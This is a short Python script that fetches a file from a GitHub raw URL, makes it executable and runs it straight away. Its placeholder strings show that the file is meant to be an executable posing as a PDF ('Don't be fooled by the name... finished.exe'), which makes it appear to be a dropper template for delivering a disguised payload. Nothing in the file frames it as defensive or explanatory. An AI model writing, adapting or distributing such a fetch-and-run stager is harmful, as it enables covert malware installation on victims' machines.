import requests
import subprocess
import os
from urllib.parse import urlparse

def download_and_execute_file(url, save_directory="."):
    response = requests.get(url)

    if response.status_code == 200:
        parsed_url = urlparse(url)
        filename = parsed_url.path.split("/")[-1]

        # Combine the save_directory and filename to get the full path
        file_path = os.path.join(save_directory, filename)

        # Ensure the save_directory exists; create it if not
        os.makedirs(save_directory, exist_ok=True)

        with open(file_path, "wb") as f:
            f.write(response.content)
        print(f"File downloaded successfully and saved at: {file_path}")

        # Make the file executable (only necessary for executable files)
        os.chmod(file_path, 0o755)

        # Execute the downloaded file
        subprocess.run([file_path])
    else:
        print("Failed to download the file.")

if __name__ == "__main__":
    # Replace this with the direct URL to your executable file on GitHub
    GITHUB_USERNAME = "Add you rgithub username here"
    NAME_OF_REPO = "Add the name of the github repository where you uploaded the software to"
    NAME_OF_PDF = "Don't be fooled by the name, add the name of the software and its file extension here; ie: finished.exe if you didnt change its name"
    github_url = f"https://raw.githubusercontent.com/{GITHUB_USERNAME}/{NAME_OF_REPO}/main/{NAME_OF_PDF}"

    # Optional: Replace this with the desired directory where the file will be saved
    save_directory = r"\path\to\save_directory"

    download_and_execute_file(github_url, save_directory)
